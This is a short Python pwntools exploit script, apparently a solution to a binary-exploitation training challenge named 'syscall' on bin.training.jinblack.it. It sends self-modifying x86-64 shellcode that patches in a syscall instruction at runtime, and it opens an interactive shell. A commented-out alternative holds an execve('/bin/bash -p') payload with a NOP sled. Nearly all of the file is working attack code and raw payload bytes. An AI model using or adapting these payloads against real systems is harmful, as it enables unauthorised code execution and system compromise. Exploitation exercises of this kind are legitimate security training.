from pwn import *


context.clear(arch='amd64',os='linux')
run_local = False
if run_local:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/malicious/shell/5/syscall')
	pid=gdb.attach(r)
	input("wait")
else:
	r=remote("bin.training.jinblack.it",3101)


shellcode = b"\x48\xC7\xC2\x00\x01\x00\x00\xBE\x33\x41\x40\x00\x31\xFF\x31\xC0\x31\xC9\x48\xB9\x90\x90\x90\x90\x90\x90\x90\x90\xB1\x0F\xB5\x05\x66\x89\x0D\x02\x00\x00\x00\x90\x90\x90"
#shellcode = b"\x90"*183+b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"+b"\x80\x40\x40\x00\x00\x00\x00\x00"
shellcode = shellcode.ljust(1000,b"A")



r.send(shellcode)

r.interactive()
